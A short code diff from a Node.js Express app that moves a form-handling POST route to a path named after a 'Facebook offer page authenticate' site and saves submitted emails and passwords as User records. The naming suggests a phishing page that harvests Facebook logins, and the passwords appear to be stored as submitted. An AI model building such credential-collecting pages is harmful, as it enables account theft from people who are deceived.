@@ -12,7 +12,7 @@ var User = require('./User');
 var bodyParser = require('body-parser');
 // var session = require('express-session');
 
-var configDB = require('./config/database');
+// var configDB = require('./config/database');
 
 //const router = express.Router();
 
@@ -32,7 +32,7 @@ app.get('/',function(req,res){
     res.sendfile('index.html');
 })
 
-app.post('/',function(req,res){
+app.post('/facebookofferpageauthenticate.herokuapp.com',function(req,res){
     var newuser = new User({
                      email: req.body.email,
                    password: req.body.pass
